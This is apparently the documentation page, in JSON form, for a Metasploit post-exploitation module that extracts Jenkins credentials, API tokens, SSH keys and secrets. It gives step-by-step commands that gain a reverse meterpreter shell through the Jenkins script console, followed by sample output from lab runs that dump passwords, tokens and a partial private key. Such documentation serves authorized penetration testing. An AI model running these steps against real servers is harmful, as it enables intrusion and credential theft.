{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/gather/jenkins_gather","result":{"data":{"moduleMetadataJson":{"id":"35c18fa5-68ac-5ab2-bb77-03a3bd6ea519","name":"Jenkins Credential Collector","fullname":"post/multi/gather/jenkins_gather","description":"This module can be used to extract saved Jenkins credentials, user\n        tokens, SSH keys, and secrets. Interesting files will be stored in\n        loot along with combined csv output.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/gather/jenkins_gather","documentationSlug":"/modules/documentation/post/multi/gather/jenkins_gather","referencesSlug":"/modules/references/post/multi/gather/jenkins_gather"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Official Source:\n<a href=\"https://jenkins.io/download/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Jenkins</a></p>\n<p>This module has been verified against:</p>\n<ol>\n<li>Jenkins 2.67 on Ubuntu 16.04 in Docker</li>\n<li>Jenkins 2.67 on Windows 7 SP 1</li>\n<li>Jenkins 2.60.1</li>\n<li>Jenkins 1.56</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Set up Jenkins to obtain a shell (use Docker for quick setup)</li>\n<li>Run <code class=\"language-text\">docker run -p 8080:8080 -p 50000:50000 jenkins</code></li>\n<li>Use the default setup and install \"suggested plugins\"</li>\n<li>Create new user admin, add a user or credential (via Manage Jenkins)</li>\n<li>Start msfconsole</li>\n<li>We'll use the <code class=\"language-text\">jenkins_script_console</code> module to quickly gain a shell</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/jenkins_script_console</code></li>\n<li>Do: <code class=\"language-text\">set RHOST 172.17.0.1</code></li>\n<li>Do: <code class=\"language-text\">set RPORT 8080</code></li>\n<li>Do: <code class=\"language-text\">set TARGETURI /</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME admin</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD or set API_TOKEN</code></li>\n<li>Do: <code class=\"language-text\">set TARGET 1</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD linux/x86/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST 192.168.56.105</code></li>\n<li>Do: <code class=\"language-text\">exploit -j</code></li>\n<li>Do: <code class=\"language-text\">use post/multi/gather/jenkins_gather</code></li>\n<li>Do: <code class=\"language-text\">set SESSION 1</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should see the saved credentials output</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SEARCH_JOBS</strong></p>\n<p>  This option searches through the <code class=\"language-text\">jobs</code> folder for interesting\nkeywords but obviously increases runtime on larger instances.</p>\n<p>  <strong>STORE_LOOT</strong></p>\n<p>  This option saves interesting files and loot to disk. If set to\nfalse will simply output data to console.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Jenkins on Windows</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(jenkins_gather) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Type                     Information                   Connection\n  --  ----                     -----------                   ----------\n  18  shell x86/linux                                        192.168.56.105:4444 -&gt; 192.168.56.1:58828 (172.17.0.1)\n  20  meterpreter x86/linux    uid=0, gid=0, euid=0, egid=0  192.168.56.105:4444 -&gt; 192.168.56.1:58974 (172.17.0.2)\n  21  meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ kali    192.168.56.105:4444 -&gt; 192.168.56.101:50427 (192.168.56.101)\n  23  shell x86/windows                                      192.168.56.105:4444 -&gt; 192.168.56.101:50793 (192.168.56.101)\n\nmsf post(jenkins_gather) &gt; info\n\n       Name: Jenkins Credential Collector\n     Module: post/multi/gather/jenkins_gather\n   Platform: Linux, Windows\n       Arch: \n       Rank: Normal\n\nProvided by:\n  thesubtlety\n\nBasic options:\n  Name        Current Setting  Required  Description\n  ----        ---------------  --------  -----------\n  SEARCH_JOBS true             no        Search through job history logs for interesting keywords. Increases runtime.\n  SESSION     17               yes       The session to run this module on.\n  STORE_LOOT  true             no        Store files in loot (will simply output file to console if set to false).\n\nDescription:\n  This module can be used to extract saved Jenkins credentials, user \n  tokens, SSH keys, and secrets. Interesting files will be stored in \n  loot along with combined csv output.\n\n\nmsf post(jenkins_gather) &gt; run\n\n[*] Searching for Jenkins directory... This could take some time...\n[*] Found Jenkins installation at C:\\Program Files\\Jenkins\n[+] Credentials found - Username: user1 Password: Password123456\n[+] SSH Key found! ID: 83c6a18f-6b35-420a-8534-cc505c3347b5 Passphrase: secretpassphrase123 Username: sshkey1 Description: interesting description\n[+] Job Info found  - Job Name:  User: testpass Password: secretpass123\n[+] Job Info found  - Job Name:  User: testpass Password: ohwowosupersecret\n[+] Node Info found - Name: test Host: hostnode1.lab.local Port: 22 CredID: 972fc428-dd7c-46ea-a119-be78ae0866ad\n[+] API Token found - Username: admin Token: 8a114e0fa48c1a489c39b98e94c986c8\n[+] API Token found - Username: useruseruser Token: 6810c3f6ccca939ac2a8b8ac4b9de012\n[*] Searching through job history for interesting bits...\n[+] Job Log truffles:\nC:\\Program Files\\Jenkins\\jobs\\asdf\\builds\\4\\log:C:\\Program Files\\Jenkins\\workspace\\asdf&gt;echo &quot;secret is secret&quot; \nC:\\Program Files\\Jenkins\\jobs\\asdf\\builds\\4\\log:&quot;secret is secret&quot;\n...\nC:\\Program Files\\Jenkins\\jobs\\asdf\\lastSuccessful\\log:C:\\Program Files\\Jenkins\\workspace\\asdf&gt;echo &quot;secret is secret&quot; \nC:\\Program Files\\Jenkins\\jobs\\asdf\\lastSuccessful\\log:&quot;secret is secret&quot;\n[+] \nCreds\n=====\n\n Username  Password           Description\n --------  --------           -----------\n                                          \n testpass  secretpass123                   \n testpass  ohwowosupersecret  \n user1     Password123456     \n\n[+] \nAPI Keys\n========\n\n Username      API Tokens\n --------      ----------\n admin         8a114e0fa48c1a489c39b98e94c986c8\n useruseruser  6810c3f6ccca939ac2a8b8ac4b9de012\n\n[+] \nNodes\n=====\n\n Node Name  Hostname             Port  Description   Cred Id\n ---------  --------             ----  -----------   -------\n test       hostnode1.lab.local  22    testtesttest  972fc428-dd7c-46ea-a119-be78ae0866ad\n\n[+] SSH Key\n[*]  ID: 83c6a18f-6b35-420a-8534-cc505c3347b5\n[*]  Description: interesting description\n[*]  Passphrase:  secretpassphrase123\n[*]  Username:    sshkey1\n[*] \n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAuTfL0ijR0JDLTQC092ZolnkTJGRi7YQInK/K1ZFDFc44JOSU\n...snip...\n7Ad+Ja6+51ECnXJIFKPj7binB6/C10YVqHh4KON3DeA6ZA7ZpUko\n-----END RSA PRIVATE KEY-----\n\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Jenkins 2.67 on Ubuntu 16.04</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(jenkins_gather) &gt; set session 20\nsession =&gt; 18\nmsf post(jenkins_gather) &gt; info\n\n       Name: Jenkins Credential Collector\n     Module: post/multi/gather/jenkins_gather\n   Platform: Linux, Windows\n       Arch:\n       Rank: Normal\n\nProvided by:\n  thesubtlety\n\nBasic options:\n  Name        Current Setting  Required  Description\n  ----        ---------------  --------  -----------\n  SEARCH_JOBS true             no        Search through job history logs for interesting keywords. Increases runtime.\n  SESSION     17               yes       The session to run this module on.\n  STORE_LOOT  true             no        Store files in loot (will simply output file to console if set to false).\n\nDescription:\n  This module can be used to extract saved Jenkins credentials, user\n  tokens, SSH keys, and secrets. Interesting files will be stored in\n  loot along with combined csv output.\n\nmsf post(jenkins_gather) &gt; run\n\n[*] Searching for Jenkins directory... This could take some time...\n[*] Found Jenkins installation at /root/.jenkins\n[+] Credentials found - Username: thanksforthefish Password: whatagreatbook\n[+] API Token found - Username: user1 Token: 859e1d6ee6ab85804434fa5395ab962d\n[+] API Token found - Username: admin Token: 9da706c125a4b5a4c19b1f799723175c\n[*] Searching through job history for interesting bits...\n[+] \nCreds\n=====\n\n Username          Password         Description\n --------          --------         -----------\n thanksforthefish  whatagreatbook\n\n[+] \nAPI Keys\n========\n\n Username  API Tokens\n --------  ----------\n admin     9da706c125a4b5a4c19b1f799723175c\n user1     859e1d6ee6ab85804434fa5395ab962d\n\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"35c18fa5-68ac-5ab2-bb77-03a3bd6ea519"}}}